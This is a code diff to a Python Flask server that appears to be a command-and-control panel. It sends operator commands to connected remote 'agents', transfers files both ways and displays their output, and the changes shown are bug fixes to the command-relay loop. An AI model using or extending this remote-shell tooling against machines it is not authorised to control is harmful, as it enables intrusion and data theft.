@@ -58,8 +58,6 @@ def server():
             connection_status['cmd_input'] = ""
             connection_status['cmd_output'] =""
             Conns[sconnection] = connection_status
-            #CMD_INPUT.append("")
-            #CMD_OUTPUT.append("")
             INDEX= INDEX +1
             app.logger.info(f'Going to handle the new connection...')
             t=threading.Thread(target=handle_connection,args=(sconnection,))
@@ -98,30 +96,29 @@ def recv_file(socket,filename):
 '''Handle the connection, this function is triggered by the server and be responsible to send commands to clients'''
 #todo - remove thread index. its not needed.
 def handle_connection(connection):
-    cmd_input = Conns[connection]['cmd_input']
-    while cmd_input != 'bye':
-        while cmd_input!='':
+    while Conns[connection]['cmd_input'] != 'bye':
+        while Conns[connection]['cmd_input']!='':
             try:
-                usr_msg = cmd_input
+                usr_msg = Conns[connection]['cmd_input']
                 #app.logger.info(f"Send command **{usr_msg}** to {Conns[connection]['Hostname']}")
                 connection.send(usr_msg.encode())
 
-                if cmd_input.split(" ")[0] =='download':
+                if Conns[connection]['cmd_input'].split(" ")[0] =='download':
                     app.logger.debug('Download command has been detected ')
-                    send_file(connection,cmd_input.split(" ")[1])
+                    send_file(connection,Conns[connection]['cmd_input'].split(" ")[1])
                     
 
-                elif cmd_input.split(" ").split(" ")[0] =='upload':
+                elif Conns[connection]['cmd_input'].split(" ")[0] =='upload':
                     app.logger.debug('Upload command has been detected ')
-                    recv_file(connection,cmd_input.split(" ")[-1])
+                    recv_file(connection,Conns[connection]['cmd_input'].split(" ")[-1])
                     
 
-                elif cmd_input !='bye':            
+                elif Conns[connection]['cmd_input'] !='bye':            
                     usr_msg=connection.recv(packet_size).decode()
-                    app.logger.debug(f"Reveiced from {Conns[connection]['Hostname']} --> {usr_msg}")
+                    app.logger.debug(f"Received from {Conns[connection]['Hostname']} --> {usr_msg}")
                     Conns[connection]['cmd_output']=usr_msg
-                
-                cmd_input=''
+                    Conns[connection]['cmd_input']=""
+
                 break
 
             except ConnectionResetError:
@@ -163,7 +160,6 @@ def execute(agentname,cmdoutput='',cmd_input=""):
             return redirect("/")
         else:
             cmdoutput = Conns[connection]['cmd_output']
-            print(cmdoutput)
             return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=agentname,cmd_input=cmd)
 
     if request.method == 'GET':
